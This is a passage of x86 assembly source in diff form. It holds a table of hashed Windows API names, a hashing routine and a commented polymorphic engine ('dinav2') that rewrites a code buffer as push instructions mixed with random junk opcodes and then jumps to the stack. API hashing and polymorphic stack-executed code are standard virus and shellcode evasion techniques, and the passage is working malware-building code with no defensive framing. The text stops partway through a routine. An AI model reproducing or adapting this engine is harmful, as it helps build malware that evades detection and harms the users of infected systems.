+zIsCharAlphaW					 EQU 07B677957h
+zIsCharLowerA					 EQU 0888A8B6Ch
+zIsCharLowerW					 EQU 09E8A8B6Ch
+zIsCharUpperA					 EQU 08B8D8E6Fh
+zIsCharUpperW					 EQU 0A18D8E6Fh
+zIsChild					 EQU 0A2818867h
+zIsClipboardFormatAvailable					 EQU 0401E2503h
+zIsDialogMessage					 EQU 0D5B4C0A4h
+zIsDialogMessageA					 EQU 0171A2805h
+zIsDialogMessageW					 EQU 02D1A2805h
+zIsDlgButtonChecked					 EQU 0FBDBE9C2h
+zIsHungAppWindow					 EQU 0E7B8BC9Dh
+zIsIconic					 EQU 00DF3FDD7h
+zIsMenu					 EQU 049212609h
+zIsRectEmpty					 EQU 04E2725FCh
+zIsWindow					 EQU 0230306EAh
+zIsWindowEnabled					 EQU 0D0C3D1AAh
+zIsWindowUnicode					 EQU 0ECDEEDC3h
+zIsWindowVisible					 EQU 0F3E5ECCFh
+zIsZoomed					 EQU 0160C19F4h
+zKillSystemTimer					 EQU 0F6F0F4CEh
+zKillTimer					 EQU 06F696D49h
+zLoadAcceleratorsA					 EQU 082A29E73h
+zLoadAcceleratorsW					 EQU 098A29E73h
+zLoadBitmapA					 EQU 00525240Ch
+zLoadBitmapW					 EQU 01B25240Ch
+zLoadCursorA					 EQU 02646431Dh
+zLoadCursorFromFileA					 EQU 03D5D6741h
+zLoadCursorFromFileW					 EQU 0535D6741h
+zLoadCursorW					 EQU 03C46431Dh
+zLoadIconA					 EQU 03050512Ch
+zLoadIconW					 EQU 04650512Ch
+zLoadImageA					 EQU 08AAAB497h
+zLoadImageW					 EQU 0A0AAB497h
+zLoadKeyboardLayoutA					 EQU 05A7A7546h
+zLoadKeyboardLayoutEx					 EQU 0D6BFE9BBh
+zLoadKeyboardLayoutW					 EQU 0707A7546h
+zLoadLocalFonts					 EQU 05D4B4620h
+zLoadMenuA					 EQU 03C5C5632h
+zLoadMenuIndirectA					 EQU 071918C70h
+zLoadMenuIndirectW					 EQU 087918C70h
+zLoadMenuW					 EQU 0525C5632h
+zLoadRemoteFonts					 EQU 0DECCC7A1h
+zLoadStringA					 EQU 01F3F4722h
+zLoadStringW					 EQU 0353F4722h
+zLockWindowStation					 EQU 0CABFBF9Dh
+zLockWindowUpdate					 EQU 04B49442Ah
+zLookupIconIdFromDirectory					 EQU 0D7CDCA9Fh
+zLookupIconIdFromDirectoryEx					 EQU 0958CB680h
+zMBToWCSEx					 EQU 01AF6F3ECh
+zMB_GetString					 EQU 09A926647h
+zMapDialogRect					 EQU 0E1DDDBC0h
+zMapVirtualKeyA					 EQU 055846C50h
+zMapVirtualKeyExA					 EQU 013422B2Eh
+zMapVirtualKeyExW					 EQU 029422B2Eh
+zMapVirtualKeyW					 EQU 06B846C50h
+zMapWindowPoints					 EQU 0F9F6E3BEh
+zMenuItemFromPoint					 EQU 0A7A19877h
+zMenuWindowProcA					 EQU 0C6F3F5CFh
+zMenuWindowProcW					 EQU 0DCF3F5CFh
+zMessageBeep					 EQU 01F222207h
+zMessageBoxA					 EQU 00D3F2C07h
+zMessageBoxExA					 EQU 0CAFCE9EEh
+zMessageBoxExW					 EQU 0E0FCE9EEh
+zMessageBoxIndirectA					 EQU 042746549h
+zMessageBoxIndirectW					 EQU 058746549h
+zMessageBoxW					 EQU 0233F2C07h
+zModifyMenuA					 EQU 021443E1Ah
+zModifyMenuW					 EQU 037443E1Ah
+zMoveWindow					 EQU 0DFDEDEC5h
+zMsgWaitForMultipleObjects					 EQU 0DACECDAFh
+zMsgWaitForMultipleObjectsEx					 EQU 09887B586h
+zNotifyWinEvent					 EQU 07C7C7D62h
+zOemKeyScan					 EQU 0B0AFB39Dh
+zOemToCharA					 EQU 084B0A38Fh
+zOemToCharBuffA					 EQU 009353419h
+zOemToCharBuffW					 EQU 01F353419h
+zOemToCharW					 EQU 09AB0A38Fh
+zOffsetRect					 EQU 0DCCED1B9h
+zOpenClipboard					 EQU 0020300EBh
+zOpenDesktopA					 EQU 08CB0B08Dh
+zOpenDesktopW					 EQU 0A2B0B08Dh
+zOpenIcon					 EQU 0F8EFF0DBh
+zOpenInputDesktop					 EQU 05D525329h
+zOpenWindowStationA					 EQU 00F33350Fh
+zOpenWindowStationW					 EQU 02533350Fh
+zPackDDElParam					 EQU 0988E8E69h
+zPaintDesktop					 EQU 0BFB8AA83h
+zPeekMessageA					 EQU 07498987Eh
+zPeekMessageW					 EQU 08A98987Eh
+zPostMessageA					 EQU 07DAFB99Fh
+zPostMessageW					 EQU 093AFB99Fh
+zPostQuitMessage					 EQU 0E0EEF6E1h
+zPostThreadMessageA					 EQU 0D80A13F7h
+zPostThreadMessageW					 EQU 0EE0A13F7h
+zPrivateExtractIconExA					 EQU 019413B3Fh
+zPrivateExtractIconExW					 EQU 02F413B3Fh
+zPrivateExtractIconsA					 EQU 0CEF6F5D1h
+zPrivateExtractIconsW					 EQU 0E4F6F5D1h
+zPrivateKDBreakPoint					 EQU 034292D0Eh
+zPtInRect					 EQU 0FDD2E3CDh
+zQuerySendMessage					 EQU 03F3F4D38h
+zRedrawWindow					 EQU 0C5B2A893h
+zRegisterClassA					 EQU 062887A55h
+zRegisterClassExA					 EQU 02046333Bh
+zRegisterClassExW					 EQU 03646333Bh
+zRegisterClassW					 EQU 078887A55h
+zRegisterClipboardFormatA					 EQU 0698F8069h
+zRegisterClipboardFormatW					 EQU 07F8F8069h
+zRegisterHotKey					 EQU 07F6D6D70h
+zRegisterLogonProcess					 EQU 00BFFF1D8h
+zRegisterServicesProcess					 EQU 05246381Dh
+zRegisterShellHookWindow					 EQU 0302015FCh
+zRegisterSystemThread					 EQU 00B0E11F8h
+zRegisterTasklist					 EQU 07B6E6044h
+zRegisterWindowMessageA					 EQU 0ACD2D2B6h
+zRegisterWindowMessageW					 EQU 0C2D2D2B6h
+zReleaseCapture					 EQU 0767D7049h
+zReleaseDC					 EQU 02750715Ch
+zRemoveMenu					 EQU 0E1D9D0BBh
+zRemovePropA					 EQU 02F5B5030h
+zRemovePropW					 EQU 0455B5030h
+zReplyMessage					 EQU 0ADB8B6A4h
+zReuseDDElParam					 EQU 0060E11EEh
+zScreenToClient					 EQU 05E5C513Bh
+zScrollChildren					 EQU 074787653h
+zScrollDC					 EQU 0CFFF1E03h
+zScrollWindow					 EQU 0C2BDB19Dh
+zScrollWindowEx					 EQU 0807A9870h
+zSendDlgItemMessageA					 EQU 016434329h
+zSendDlgItemMessageW					 EQU 02C434329h
+zSendInput					 EQU 076706041h
+zSendMessageA					 EQU 06D9A9A83h
+zSendMessageCallbackA					 EQU 07DAAA48Eh
+zSendMessageCallbackW					 EQU 093AAA48Eh
+zSendMessageTimeoutA					 EQU 05784754Dh
+zSendMessageTimeoutW					 EQU 06D84754Dh
+zSendMessageW					 EQU 0839A9A83h
+zSendNotifyMessageA					 EQU 0E91615FCh
+zSendNotifyMessageW					 EQU 0FF1615FCh
+zSetActiveWindow					 EQU 0D8D5CBB6h
+zSetCapture					 EQU 0D6E5D8B4h
+zSetCaretBlinkTime					 EQU 073827A5Fh
+zSetCaretPos					 EQU 024251B1Bh
+zSetClassLongA					 EQU 0CAFDFBDDh
+zSetClassLongW					 EQU 0E0FDFBDDh
+zSetClassWord					 EQU 095A59879h
+zSetClipboardData					 EQU 00F221300h
+zSetClipboardViewer					 EQU 0080A09E0h
+zSetConsoleReserveKeys					 EQU 052533F26h
+zSetCursor					 EQU 080827856h
+zSetCursorContents					 EQU 0D1D2C3A3h
+zSetCursorPos					 EQU 0B3B4AAAAh
+zSetDebugErrorLevel					 EQU 0EEF6F6CEh
+zSetDeskWallpaper					 EQU 034363614h
+zSetDlgItemInt					 EQU 0D4D4CBD2h
+zSetDlgItemTextA					 EQU 090C3B48Bh
+zSetDlgItemTextW					 EQU 0A6C3B48Bh
+zSetDoubleClickTime					 EQU 0D5E4DCC1h
+zSetFocus					 EQU 00202F2E1h
+zSetForegroundWindow					 EQU 099968C75h
+zSetInternalWindowPos					 EQU 0EDEEE4E1h
+zSetKeyboardState					 EQU 037463724h
+zSetLastErrorEx					 EQU 05F5B7B58h
+zSetLogonNotifyWindow					 EQU 0F6F3E9D2h
+zSetMenu					 EQU 096958C79h
+zSetMenuContextHelpId					 EQU 0B6C6E2BFh
+zSetMenuDefaultItem					 EQU 0EEF5F5CFh
+zSetMenuItemBitmaps					 EQU 0F9FAEFDCh
+zSetMenuItemInfoA					 EQU 0F6291F07h
+zSetMenuItemInfoW					 EQU 00C291F07h
+zSetMessageExtraInfo					 EQU 05B605F3Eh
+zSetMessageQueue					 EQU 0CEDDCDB7h
+zSetParent					 EQU 06C6C634Fh
+zSetProcessWindowStation					 EQU 041473D1Fh
+zSetProgmanWindow					 EQU 0514E442Eh
+zSetPropA					 EQU 0E4170BEEh
+zSetPropW					 EQU 0FA170BEEh
+zSetRect					 EQU 08F8F917Eh
+zSetRectEmpty					 EQU 0A09B8C6Ch
+zSetScrollInfo					 EQU 0FF0402E4h
+zSetScrollPos					 EQU 0A4A59B9Bh
+zSetScrollRange					 EQU 0606F6D4Eh
+zSetShellWindow					 EQU 074716752h
+zSetShellWindowEx					 EQU 0322E4E25h
+zSetSysColors					 EQU 0B4B5A889h
+zSetSysColorsTemp					 EQU 04C504831h
+zSetSystemCursor					 EQU 00809FFDBh
+zSetSystemMenu					 EQU 01E1D13FEh
+zSetSystemTimer					 EQU 08A8C8C6Eh
+zSetTaskmanWindow					 EQU 04C493F29h
+zSetThreadDesktop					 EQU 0373B310Bh
+zSetTimer					 EQU 0030504E9h
+zSetUserObjectInformationA					 EQU 0C5F8EFCBh
+zSetUserObjectInformationW					 EQU 0DBF8EFCBh
+zSetUserObjectSecurity					 EQU 055504124h
+zSetWinEventHook					 EQU 0C5CEC4A4h
+zSetWindowContextHelpId					 EQU 09AAAC6A2h
+zSetWindowLongA					 EQU 04D807E5Fh
+zSetWindowLongW					 EQU 063807E5Fh
+zSetWindowPlacement					 EQU 017170DF6h
+zSetWindowPos					 EQU 0ADAEA4A4h
+zSetWindowRgn					 EQU 0A2A8A6A4h
+zSetWindowStationUser					 EQU 0000201DBh
+zSetWindowTextA					 EQU 06295865Dh
+zSetWindowTextW					 EQU 07895865Dh
+zSetWindowWord					 EQU 018281AFBh
+zSetWindowsHookA					 EQU 0C1F4EECEh
+zSetWindowsHookExA					 EQU 07FB29FA8h
+zSetWindowsHookExW					 EQU 095B29FA8h
+zSetWindowsHookW					 EQU 0D7F4EECEh
+zShowCaret					 EQU 068636645h
+zShowCursor					 EQU 0F7F4EDCBh
+zShowOwnedPopups					 EQU 0FFFBF3CDh
+zShowScrollBar					 EQU 0FEFC0310h
+zShowStartGlass					 EQU 0837F7462h
+zShowWindow					 EQU 0F1E9E2CFh
+zShowWindowAsync					 EQU 0F1FDF7CDh
+zSoftModalMessageBox					 EQU 05543434Eh
+zSubtractRect					 EQU 0AF9DAF9Ah
+zSwapMouseButton					 EQU 0F9ECF4CFh
+zSwitchDesktop					 EQU 01D161DF9h
+zSwitchToThisWindow					 EQU 0180A11FBh
+zSystemParametersInfoA					 EQU 02E606A50h
+zSystemParametersInfoW					 EQU 044606A50h
+zTabbedTextOutA					 EQU 04D6E5B36h
+zTabbedTextOutW					 EQU 0636E5B36h
+zTileChildWindows					 EQU 039322404h
+zTileWindows					 EQU 0534C3E20h
+zToAscii					 EQU 0A9818777h
+zToAsciiEx					 EQU 067305A43h
+zToUnicode					 EQU 074646F52h
+zToUnicodeEx					 EQU 0320F3925h
+zTrackMouseEvent					 EQU 0DDCACEB9h
+zTrackPopupMenu					 EQU 07B676B56h
+zTrackPopupMenuEx					 EQU 039224F29h
+zTranslateAccelerator					 EQU 0F2E1E4BEh
+zTranslateAcceleratorA					 EQU 034545432h
+zTranslateAcceleratorW					 EQU 04A545432h
+zTranslateMDISysAccel					 EQU 07E73806Bh
+zTranslateMessage					 EQU 0514D5846h
+zTranslateMessageEx					 EQU 00EF8250Eh
+zUnhookWinEvent					 EQU 07D71715Dh
+zUnhookWindowsHook					 EQU 0CAC7C6A7h
+zUnhookWindowsHookEx					 EQU 08878A185h
+zUnionRect					 EQU 06D626D5Bh
+zUnloadKeyboardLayout					 EQU 0E9E1DABAh
+zUnlockWindowStation					 EQU 09D9B9A80h
+zUnpackDDElParam					 EQU 05D606D4Ch
+zUnregisterClassA					 EQU 02F605B38h
+zUnregisterClassW					 EQU 045605B38h
+zUnregisterHotKey					 EQU 04C454E53h
+zUpdatePerUserSystemParameters					 EQU 0A3949278h
+zUpdateWindow					 EQU 0B5A2A391h
+zUserClientDllInitialize					 EQU 00706FFE4h
+zUserRealizePalette					 EQU 0131311EDh
+zUserRegisterWowHandlers					 EQU 02D1F2008h
+zValidateRect					 EQU 098908E7Ch
+zValidateRgn					 EQU 0312F292Ah
+zVkKeyScanA					 EQU 0A6B0ADA0h
+zVkKeyScanExA					 EQU 0646E616Fh
+zVkKeyScanExW					 EQU 07A6E616Fh
+zVkKeyScanW					 EQU 0BCB0ADA0h
+zWCSToMBEx					 EQU 010EBE9FDh
+zWaitForInputIdle					 EQU 02E322715h
+zWaitMessage					 EQU 03C403A2Dh
+zWinHelpA					 EQU 0CBF8F1DBh
+zWinHelpW					 EQU 0E1F8F1DBh
+zWindowFromDC					 EQU 06893B89Fh
+zWindowFromPoint					 EQU 0ECE6E1CBh
+zkeybd_event					 EQU 04A4F4649h
+zmouse_event					 EQU 05C5D5E63h
+zwsprintfA					 EQU 06695A2A3h
+zwsprintfW					 EQU 07C95A2A3h
+zwvsprintfA					 EQU 0D7091919h
+zwvsprintfW					 EQU 0ED091919h
+zSetHandleCount					 EQU 05959502Ah
+zSetHandleInformation				 EQU 0D8DED4B8h
+zSetLastConsoleEventActive			 EQU 0CDDCCBADh
+zSetLastError					 EQU 0A1A39977h
+zSetLocalTime					 EQU 07D8C846Bh
+zSetLocaleInfoA					 EQU 021544A33h
+zSetLocaleInfoW					 EQU 037544A33h
+zSetMailslotInfo					 EQU 0D5DAD9BAh
+zSetNamedPipeHandleState					 EQU 0C7D6C7B2h
+zSetPriorityClass					 EQU 05D5E503Dh
+zSetProcessAffinityMask					 EQU 0ACB5A792h
+zSetProcessPriorityBoost					 EQU 05050421Eh
+zSetProcessShutdownParameters					 EQU 0595A4D31h
+zSetProcessWorkingSetSize					 EQU 08F9E896Bh
+zSetStdHandle					 EQU 07A89826Eh
+zSetSystemPowerState					 EQU 099A89985h
+zSetSystemTime					 EQU 018271F05h
+zSetSystemTimeAdjustment					 EQU 03B3B3218h
+zSetTapeParameters					 EQU 0A3A49780h
+zSetTapePosition					 EQU 0E3E9DFC5h
+zSetThreadAffinityMask					 EQU 0252E200Bh
+zSetThreadContext					 EQU 042422F18h
+zSetThreadIdealProcessor					 EQU 0FF00F6CFh
+zSetThreadLocale					 EQU 0ACBBB4A2h
+zSetThreadPriority					 EQU 0BFBAAB90h
+zSetThreadPriorityBoost					 EQU 0C8C8BA97h
+zSetTimeZoneInformation					 EQU 0B8BEB497h
+zSetUnhandledExceptionFilter					 EQU 0B1B3B389h
+zSetVDMCurrentDirectories					 EQU 04F505032h
+zSetVolumeLabelA					 EQU 09DD0C9B3h
+zSetVolumeLabelW					 EQU 0B3D0C9B3h
+zSetWaitableTimer					 EQU 02F313112h
+zSetupComm					 EQU 0737A7254h
+zShowConsoleCursor					 EQU 0CDCAC39Eh
+zSignalObjectAndWait					 EQU 04033331Fh
+zSizeofResource					 EQU 0869BA17Eh
+zSleep					 EQU 0D5CAD1BFh
+zSleepEx					 EQU 09380A789h
+zSuspendThread					 EQU 003122610h
+zSwitchToFiber					 EQU 0EDE4F6E4h
+zSwitchToThread					 EQU 05E637963h
+zSystemTimeToFileTime					 EQU 0ADBBC7ABh
+zSystemTimeToTzSpecificLocalTime					 EQU 0111F2B0Ah
+zTerminateProcess					 EQU 06261533Dh
+zTerminateThread					 EQU 0DAE8ECD7h
+zTlsAlloc					 EQU 0ECFCF9E0h
+zTlsFree					 EQU 083919879h
+zTlsGetValue					 EQU 0202E250Ah
+zTlsSetValue					 EQU 02C3A3116h
+zTransactNamedPipe					 EQU 0918D8F75h
+zTransmitCommChar					 EQU 03A293A21h
+zTrimVirtualBuffer					 EQU 0B3AAB7A0h
+zTryEnterCriticalSection					 EQU 0061113F7h
+zNTDLLRtlTryEnterCriticalSection					 EQU 04015FAD5h
+zUnhandledExceptionFilter					 EQU 0857B845Dh
+zUnlockFile					 EQU 0BFC6C8B2h
+zUnlockFileEx					 EQU 07D719A87h
+zUnmapViewOfFile					 EQU 0A5ADAF97h
+zUpdateResourceA					 EQU 0C7EAF5E3h
+zUpdateResourceW					 EQU 0DDEAF5E3h
+zVDMConsoleOperation					 EQU 08A693E25h
+zVDMOperationStarted					 EQU 08E775632h
+zVerLanguageNameA					 EQU 0EB1C1C00h
+zVerLanguageNameW					 EQU 0011C1C00h
+zVerifyConsoleIoHandle					 EQU 026332C17h
+zVirtualAlloc					 EQU 0A4B3AD94h
+zVirtualAllocEx					 EQU 0625C806Fh
+zVirtualBufferExceptionHandler					 EQU 087878B6Bh
+zVirtualFree					 EQU 03B484C2Dh
+zVirtualFreeEx					 EQU 0F8F31704h
+zVirtualLock					 EQU 042494F33h
+zVirtualProtect					 EQU 09B999F8Ch
+zVirtualProtectEx					 EQU 059537754h
+zVirtualQuery					 EQU 0CFC8BFADh
+zVirtualQueryEx					 EQU 08D87AB84h
+zVirtualUnlock					 EQU 0262D3316h
+zWaitCommEvent					 EQU 005FAEDDCh
+zWaitForDebugEvent					 EQU 0897E715Eh
+zWaitForMultipleObjects					 EQU 0B8AE9B88h
+zWaitForMultipleObjectsEx					 EQU 07667835Fh
+zWaitForSingleObject					 EQU 05A4F4D39h
+zWaitForSingleObjectEx					 EQU 018092501h
+zWaitNamedPipeA					 EQU 02C545033h
+zWaitNamedPipeW					 EQU 042545033h
+zWideCharToMultiByte					 EQU 04B4A3F17h
+zWinExec					 EQU 086919573h
+zWriteConsoleA					 EQU 0F119260Dh
+zWriteConsoleInputA					 EQU 0032B2905h
+zWriteConsoleInputVDMA					 EQU 0EB133844h
+zWriteConsoleInputVDMW					 EQU 001133844h
+zWriteConsoleInputW					 EQU 0192B2905h
+zWriteConsoleOutputA					 EQU 084ACAA86h
+zWriteConsoleOutputAttribute					 EQU 0FAFEFCD5h
+zWriteConsoleOutputCharacterA					 EQU 0153D3D25h
+zWriteConsoleOutputCharacterW					 EQU 02B3D3D25h
+zWriteConsoleOutputW					 EQU 09AACAA86h
+zWriteConsoleW					 EQU 00719260Dh
+zWriteFile					 EQU 05B5F6551h
+zWriteFileEx					 EQU 0190A3726h
+zWriteFileGather					 EQU 0B8AFBCA7h
+zWritePrivateProfileSectionA					 EQU 0A4CCD0AFh
+zWritePrivateProfileSectionW					 EQU 0BACCD0AFh
+zWritePrivateProfileStringA					 EQU 0466E7959h
+zWritePrivateProfileStringW					 EQU 05C6E7959h
+zWritePrivateProfileStructA					 EQU 0547C7A65h
+zWritePrivateProfileStructW					 EQU 06A7C7A65h
+zWriteProcessMemory					 EQU 037272709h
+zWriteProfileSectionA					 EQU 0C6EEF2D4h
+zWriteProfileSectionW					 EQU 0DCEEF2D4h
+zWriteProfileStringA					 EQU 068909B7Eh
+zWriteProfileStringW					 EQU 07E909B7Eh
+zWriteTapemark					 EQU 012101002h
+z_hread					 EQU 02B394039h
+z_hwrite					 EQU 0B5C7BBB0h
+z_lclose					 EQU 0B4B2AB9Ah
+z_lcreat					 EQU 0AD9CA7A0h
+z_llseek					 EQU 0A9AAB1AAh
+z_lopen					 EQU 044454C3Ah
+z_lread					 EQU 02B39443Dh
+z_lwrite					 EQU 0B5C7BFB4h
+zlstrcat					 EQU 0ABABBDC5h
+zlstrcatA					 EQU 0ED201F28h
+zlstrcatW					 EQU 003201F28h
+zlstrcmp					 EQU 0B3B7BDC5h
+zlstrcmpA					 EQU 0F5282B28h
+zlstrcmpW					 EQU 00B282B28h
+zlstrcmpi					 EQU 01D282B28h
+zlstrcmpiA					 EQU 05E919B95h
+zlstrcmpiW					 EQU 074919B95h
+zlstrcpy					 EQU 0BFBABDC5h
+zlstrcpyA					 EQU 001342E28h
+zlstrcpyW					 EQU 017342E28h
+zlstrcpyn					 EQU 02E342E28h
+zlstrcpynA					 EQU 06FA2A798h
+zlstrcpynW					 EQU 085A2A798h
+zlstrlen					 EQU 0B2B8C6C5h
+zlstrlenA					 EQU 0F4272C31h
+zlstrlenW					 EQU 00A272C31h
+===== end   crc32use.inc =====
+
+===== begin crc32api.inc =====
+include crc32.inc
+include crc32use.inc
+;-------------------- Code ---------------------------------------------
+
+;CRCSum: xor eax,eax
+;Sum:    add eax,dword ptr [ebx]
+;        cmp byte ptr [ebx+4],0
+;        je ExitfromCRCSum
+;        inc ebx
+;        jmp Sum
+;ExitfromCRCSum:
+;           ret
+CRCSum: xor eax,eax
+Sum:    add eax,dword ptr [esi]
+        cmp byte ptr [esi+4],0
+        je_ ExitfromCRCSum
+        inc esi
+        jmp_ Sum
+ExitfromCRCSum:
+           ret
+===== end   crc32api.inc =====
+
+===== begin dinav2.inc =====
+; V2.2  07.06.2000
+;  Добавлено:  
+;  jmp esp+x  Теперь управление передается не в начало кода, 
+;             а по смещению заданному в EDX  при вызове MakePolyImg 
+;  pusha      Сохранение первоначального значения регистров
+;  NopsMaxCount и MycopMaxCount задаются как параметры процедуры MakePolyImg
+;
+include macro.inc
+include random.inc
+NopsMaxCount  EQU  10  ; Максимальное колличество случайно генерируемых нопов.
+MycopMaxCount EQU  8   ; Максимальное колличество случайно генерируемых команд.
+                       ; Влияют на коэффициент увеличения кода.
+                       ; K(10,10)=8
+                       ; K(10,5)=6..7
+                       ; K(5,10)=6
+                       ; K(5,5)=4..5
+                       ; K(5,12)=6
+;---------------------------------------------------------------------------
+; in  esi= Code
+;     edi= Buffer
+;     ecx= size of code
+;     edx= Entry point offset
+;     in stack dd (dw NopsMaxCount, dw MycopMaxCount)
+MakePolyImg: push ebp
+             mov ebp,esp
+             pusha
+             push ecx
+             add esi,ecx
+             shr ecx,2 ; size/4
+             push ecx
+             sub esi,4
+             call GenNops
+             mov al,60h    ; pusha
+             cld           ;
+             stosb         ;
+@MakePolyImgL1:
+              push ecx
+              mov ax,word ptr [ebp+MycopMaxCount]
+              call RandEAX
+              xchg eax,ecx
+              inc ecx
+GenMycopLoop:push ecx
+             call GenMycop
+             pop ecx
+             loop GenMycopLoop
+             mov ax,05h
+             call RandEAX
+             xchg ecx,eax
+             push esi
+             mov  esi,[esi]
+             call MakePush0xXXXXXXXX
+             pop esi
+             pop ecx
+             sub esi,4
+             loop @MakePolyImgL1
+             pop ecx
+             pop eax
+             shl ecx,2
+             sub eax,ecx
+             or eax,eax
+             je_ @Mod0
+             push eax
+             mov  esi,[esi]
+             call MakePush0xXXXXXXXX
+             pop eax
+             mov cl,4
+             sub al,cl
+             neg al
+             regEDX EQU 5*4
+@Mod0:      add eax,[esp+regEDX]
+            call MakeJMP2ESP
+             mov eax,[esp]
+             sub edi,eax
+             mov [esp+1ch],edi
+             popa
+             pop ebp
+             ret  4
+ChetHe4et:   call Rand0xFF
+             and al,00000001b
+             ret
+;---------------------------------------------------------------------------
+; in  eax=(4-mod(CodeSize/4))  остаток от деления на 4
+MakeJMP2ESP: push eax
+             call ChetHe4et
+             or al,al
+             je_ @MakeJMP2ESPL1
+             mov al,54h  ;push esp
+             cld
+             stosb
+             call GenNops
+             mov dl,58h  ;push eax
+             call GenRegF
+             add dl,al
+             xchg dl,al
+             cld
+             stosb
+             jmp MakeADD_eax_03
+@MakeJMP2ESPL1:mov al,08bh    ; mov eax,esp
+               cld
+               stosb
+               call GenRegF
+               mov dl,al
+               mov cl,al
+               mov ch,04
+               call opCode_eRg1&eRg2
+               cld
+               stosb
+MakeADD_eax_03:
+               call GenNops
+               mov al,40h
+               add al,dl
+               pop ecx
+               or ecx,ecx
+               je_ @Zero
+@MakeADD_eax_03L1:
+               cld
+               stosb
+               call GenNops
+               loop @MakeADD_eax_03L1
+@Zero:         mov ax,0e0ffh
+               add ah,dl
+               cld
+               stosw
+               call GenNops
+               ret
+;---------------------------------------------------------------------------
+GenMycop:  call ChetHe4et
+           or al,al
+           je_ @GenMycopL1
+           mov ax,08h      ; Генерируем команду
+           call RandEAX    ;
+           shl ax,3  ; *8  ;
+           xchg ax,dx      ;
+           mov ax,05h      ;
+           call RandEAX    ;
+           add dx,ax       ;
+           xchg dx,ax
+           cld
+           stosb
+           call Gen&SetRegsOpCode
+           ret
+Gen&SetRegsOpCode:
+           call GenReg
+           mov cl,al
+           call GenReg
+           mov ch,al
+           call opCode_eRg1&eRg2
+           cld
+           stosb
+           ret
+@GenMycopL1: mov dl,84h
+             mov ax,08h
+             call RandEAX
+             add dl,al
+             xchg dl,al
+             cld
+             stosb
+             call Gen&SetRegsOpCode
+             ret
+GenNops:  pusha
+          mov ax,word ptr [NopsMaxCount+ebp]
+          call RandEAX
+@GenNopsL1:
+          or ax,ax
+          je_ @GenNopsL2
+          push eax
+          mov ax,3     ;Type of nop
+          Call RandEAX ;
+          xchg ax,cx   ;
+          call GenNop
+          pop eax
+          dec ax
+          jmp @GenNopsL1
+@GenNopsL2:
+          mov [esp],edi
+          popa
+          ret
+;----------------------------------------------------------------------------
+; in ecx=Type of nop (0..2)
+;    edi=Dest
+GenNop:            and ecx,00000000000000000000000000000011b
+                   call @GenNopl1
+        @GenNopl2: dw offset case0 - offset @GenNopl2
+                   dw offset case1 - offset @GenNopl2
+                   dw offset case2 - offset @GenNopl2
+                   dw offset ERts - offset @GenNopl2
+        @GenNopl1: pop ebx
+                   shl ecx,1
+                   add bx,word ptr [ebx+ecx]
+                   jmp ebx
+;-------------------------------------------------------------
+case0:             call GenRegF  ;
+                   mov cx,05850h
+                   add ch,al
+                   add cl,al
+                   xchg ecx,eax
+                   cld
+                   stosw
+                   ret
+;-------------------------------------------------------------
+                   db 03bh,085h,086h,0bh,8bh,08Dh,08h,0A3h;
+case1:             sub ebx,08
+                   call GenRegF
+                   mov cl,al
+                   call GenRegF
+                   mov ch,al
+                   mov eax,08h
+                   call RandEAX
+                   add ebx,eax
+                   mov ah,byte ptr [ebx]
+                   cmp al,2
+                   jl_ @@1
+                   cmp al,6
+                   jg_ @@1
+                   mov cl,ch
+@@1:               mov dl,al
+                   cmp dl,5
+                   jne_ @@3
+                   sub al,0c0h     ; lea EAX,[EAX]
+                   cmp cl,5
+                   jne_ @@4
+                   inc cl
+              @@4: cmp cl,4
+                   jne_ @@5
+                   inc cl
+                   inc cl
+              @@5: cmp ch,5
+                   jne_ @@6
+                   inc ch
+              @@6: cmp ch,4
+                   jne_ @@3
+                   inc ch
+                   inc ch
+              @@3: call opCode_eRg1&eRg2
+                   cmp dl,5
+                   jne_ @@7
+                   sub al,0c0h     ; lea EAX,[EAX]
+              @@7: xchg al,ah
+                   cmp dl,7
+                   jl_ @@2
+                   push eax
+                   mov al,0fh
+                   cld
+                   stosb
+                   pop eax
+@@2:               cld
+                   stosw
+                   ret
+case2:             call GenRegF  ;
+                   mov cx,04840h
+                   add ch,al
+                   add cl,al
+                   xchg ecx,eax
+                   push eax
+                   mov  ax,0ffh
+                   call RandEAX
+                   mov cx,ax
+                   pop eax
+                   inc ecx
+                   @@@1:
+                   xchg al,ah
+                   loop @@@1
+                   cld
+                   stosw
+ERts:              ret
+;----------------------------------------------------------------------------
+; in
+; cl=eRg1#
+; ch=eRg2#
+; out
+; al=opCode eRg1&eRg2
+opCode_eRg1&eRg2:
+                 mov al,0c0h
+                 shl cl,3
+                 add al,cl
+                 add al,ch
+                 ret
+;----------------------------------------------------------------------------
+; esi = 0xXXXXXXXX
+; edi = Dest
+; ecx = Metod# (0..4)
+Metod EQU 4
+MakePush0xXXXXXXXX:
+                   and ecx,00000000000000000000000000000111B
+                   cmp cl,5
+                   jl_ @g
+                   mov cl,4
+                 @g:
+                   call @l1
+              @l2: dw offset Metod1 - offset @l2
+                   dw offset Metod2 - offset @l2
+                   dw offset Metod3 - offset @l2
+                   dw offset Metod4 - offset @l2
+                   dw offset Metod4b - offset @l2
+              @l1: pop ebx
+                  ;mov ecx,Metod
+                   shl ecx,1
+                   add bx,word ptr [ebx+ecx]
+                   jmp ebx
+Metod1:
+                   mov al,068h    ;  push 0xXXXXXXXX
+                   cld            ;
+                   stosb          ;
+                   xchg eax,esi
+                   cld            ;
+                   stosd          ;
+                   ret
+;----------------------------------------------------------------------
+Metod2:
+                                   ;    mov eRg,0xXXXXXXXX
+                  ; call GenReg     ;    push eRg
+                  ; call MakeMOVeRg0xXXXXXXXX
+                   call Opt2
+                   call GenNops
+                   call MakePush_eRg
+                   ret            ;
+;----------------------------------------------------------------------
+Metod3:            ;call GenReg
+                   ;call MakeMOVeRg0xXXXXXXXX
+                   call Opt2
+                   shl dl,3       ; Reg#*8
+                   call GenReg
+                   push eax
+                   add dl,al
+                   mov ax,0C087h
+                   add ah,dl
+                   cld
+                   stosw
+                   pop edx
+                   call GenNops
+                   call MakePush_eRg
+                   ret
+Rand0xFF:
+                 mov al,0ffh
+                 call RandEAX
+                 ret
+;-------------------------------------------------------------------
+Opt1:            call Rand0xFF
+                 xchg cl,al
+                 ret
+Opt2:            call GenReg
+                 call MakeMOVeRg0xXXXXXXXX
+                 call GenNops
+                 ret
+Opt3:              add ah,dl
+                   cld
+                   stosw
+                   xchg cl,al
+                   cld
+                   stosb
+                   call GenNops
+                   call MakePush_eRg
+                   ret
+Metod4:            call Opt1
+                   ror esi,cl
+                   call Opt2
+
+                   mov ax,0C0C1h
+                   call Opt3
+                   ret
+Metod4b:           call Opt1
+                   rol esi,cl
+                   call Opt2
+                   mov ax,0C8C1h
+                   call Opt3
